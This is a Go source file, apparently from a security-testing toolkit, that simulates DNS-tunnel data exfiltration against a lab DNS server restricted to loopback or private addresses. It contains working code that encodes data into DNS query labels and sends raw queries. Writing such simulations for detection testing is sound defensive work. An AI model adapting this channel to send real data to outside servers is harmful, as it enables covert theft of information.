// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2024 opensecstack contributors.

package exfil

// DNS tunneling simulation.
//
// Encodes a payload into DNS query labels and sends them to a configurable
// DNS server. Records whether queries succeed (indicating the channel is
// open) or are blocked/refused (indicating detection/filtering is active).
// No actual data is transmitted to external infrastructure — all queries
// target the isolated lab DNS server.
//
// Safety guarantee: DNS server must be loopback or RFC 1918.

import (
	"context"
	"encoding/base32"
	"fmt"
	"net"
	"strings"
	"time"
)

// DNSTunnelAttack simulates DNS-based data exfiltration covert channel.
type DNSTunnelAttack struct{}

// DNSTunnelResult holds the outcome of the DNS tunnel simulation.
type DNSTunnelResult struct {
	Technique       string
	Success         bool
	Evidence        []string
	Duration        time.Duration
	QueriesSent     int
	QueriesBlocked  int
	QueriesResolved int
}

// NewDNSTunnelAttack returns a ready DNSTunnelAttack.
func NewDNSTunnelAttack() *DNSTunnelAttack { return &DNSTunnelAttack{} }

// Run simulates DNS tunnel exfiltration.
//
// Recognised params keys:
//   - "dns_server"  string — IP:port of the isolated lab DNS server (required; must be RFC 1918/loopback)
//   - "domain"      string — base domain to append to queries, e.g. "exfil.lab.internal" (default "exfil.lab.internal")
//   - "payload"     string — data to encode and send (default: synthetic dataset of 64 bytes)
//   - "chunk_size"  int    — bytes per DNS label chunk (default 30, max 50)
func (d *DNSTunnelAttack) Run(ctx context.Context, params map[string]any) (*DNSTunnelResult, error) {
	dnsServer, _ := params["dns_server"].(string)
	if dnsServer == "" {
		return nil, fmt.Errorf("dns_tunnel: params[\"dns_server\"] is required")
	}

	// Safety: DNS server must be private/loopback.
	host, _, err := net.SplitHostPort(dnsServer)
	if err != nil {
		// Maybe no port — treat whole string as host.
		host = dnsServer
		dnsServer = net.JoinHostPort(dnsServer, "53")
	}
	if err := checkDNSServer(ctx, host); err != nil {
		return nil, err
	}

	domain, _ := params["domain"].(string)
	if domain == "" {
		domain = "exfil.lab.internal"
	}

	payload, _ := params["payload"].(string)
	if payload == "" {
		payload = "SecureLab-DNSTunnel-SimulatedExfilPayload-0123456789ABCDEF"
	}

	chunkSize := intParam(params, "chunk_size", 30, 50)

	start := time.Now()
	result := &DNSTunnelResult{Technique: "DNSTunnel"}

	// Encode payload with base32 (DNS-safe: uppercase letters and digits only).
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(payload))
	chunks := splitIntoChunks(encoded, chunkSize)

	dialer := &net.Dialer{Timeout: 3 * time.Second}

	for i, chunk := range chunks {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(start)
			return result, ctx.Err()
		default:
		}

		// Build FQDN: <seq>-<chunk>.<domain>
		// DNS labels must be lowercase for resolver compatibility.
		label := fmt.Sprintf("%04d-%s", i, strings.ToLower(chunk))
		fqdn := label + "." + domain

		result.QueriesSent++

		conn, err := dialer.DialContext(ctx, "udp", dnsServer)
		if err != nil {
			result.QueriesBlocked++
			result.Evidence = append(result.Evidence,
				fmt.Sprintf("DNSTunnel: chunk %d — DNS connection refused/blocked: %v", i, err))
			continue
		}

		// Send a minimal raw DNS query for the FQDN.
		query := buildDNSQuery(fqdn, uint16(i+1))
		_ = conn.SetDeadline(time.Now().Add(2 * time.Second))
		_, writeErr := conn.Write(query)
		if writeErr != nil {
			conn.Close()
			result.QueriesBlocked++
			result.Evidence = append(result.Evidence,
				fmt.Sprintf("DNSTunnel: chunk %d — write failed: %v", i, writeErr))
			continue
		}

		// Read response (any response means query was received).
		buf := make([]byte, 512)
		n, readErr := conn.Read(buf)
		conn.Close()

		if readErr != nil || n < 4 {
			result.QueriesBlocked++
			result.Evidence = append(result.Evidence,
				fmt.Sprintf("DNSTunnel: chunk %d — no response for %q (blocked/filtered)", i, fqdn))
		} else {
			result.QueriesResolved++
			result.Success = true
			result.Evidence = append(result.Evidence,
				fmt.Sprintf("DNSTunnel: chunk %d — query for %q received response (%d bytes) — channel open", i, fqdn, n))
		}
	}

	result.Duration = time.Since(start)
	if result.QueriesBlocked == result.QueriesSent && result.QueriesSent > 0 {
		result.Evidence = append(result.Evidence, "DNSTunnel: all queries blocked — DNS tunnel appears to be detected/filtered")
	}
	return result, nil
}

// splitIntoChunks divides s into chunks of size n.
func splitIntoChunks(s string, n int) []string {
	var chunks []string
	for len(s) > n {
		chunks = append(chunks, s[:n])
		s = s[n:]
	}
	if s != "" {
		chunks = append(chunks, s)
	}
	return chunks
}

// buildDNSQuery constructs a minimal DNS A-record query packet for fqdn.
func buildDNSQuery(fqdn string, txID uint16) []byte {
	// DNS header: ID (2) + flags (2) + QDCOUNT (2) + others (6) = 12 bytes
	header := []byte{
		byte(txID >> 8), byte(txID),
		0x01, 0x00, // flags: standard query, recursion desired
		0x00, 0x01, // QDCOUNT = 1
		0x00, 0x00, // ANCOUNT = 0
		0x00, 0x00, // NSCOUNT = 0
		0x00, 0x00, // ARCOUNT = 0
	}

	// Encode FQDN as DNS name labels.
	var question []byte
	for _, label := range strings.Split(strings.TrimRight(fqdn, "."), ".") {
		question = append(question, byte(len(label)))
		question = append(question, []byte(label)...)
	}
	question = append(question, 0x00)       // root label
	question = append(question, 0x00, 0x01) // QTYPE = A
	question = append(question, 0x00, 0x01) // QCLASS = IN

	return append(header, question...)
}

// checkDNSServer ensures the DNS server host is private/loopback.
func checkDNSServer(ctx context.Context, host string) error {
	ip := net.ParseIP(host)
	if ip == nil {
		addrs, err := new(net.Resolver).LookupHost(ctx, host)
		if err != nil || len(addrs) == 0 {
			return fmt.Errorf("safety: cannot resolve dns_server host %q", host)
		}
		ip = net.ParseIP(addrs[0])
	}
	if ip == nil {
		return fmt.Errorf("safety: cannot parse dns_server IP")
	}
	if ip.IsLoopback() {
		return nil
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return fmt.Errorf("safety: dns_server must be an IPv4 RFC 1918 or loopback address")
	}
	for _, r := range []struct {
		net  net.IP
		mask net.IPMask
	}{
		{net.IP{10, 0, 0, 0}, net.IPMask{255, 0, 0, 0}},
		{net.IP{172, 16, 0, 0}, net.IPMask{255, 240, 0, 0}},
		{net.IP{192, 168, 0, 0}, net.IPMask{255, 255, 0, 0}},
	} {
		if ip4.Mask(r.mask).Equal(r.net) {
			return nil
		}
	}
	return fmt.Errorf("safety: dns_server %q is not a loopback or RFC 1918 address", host)
}
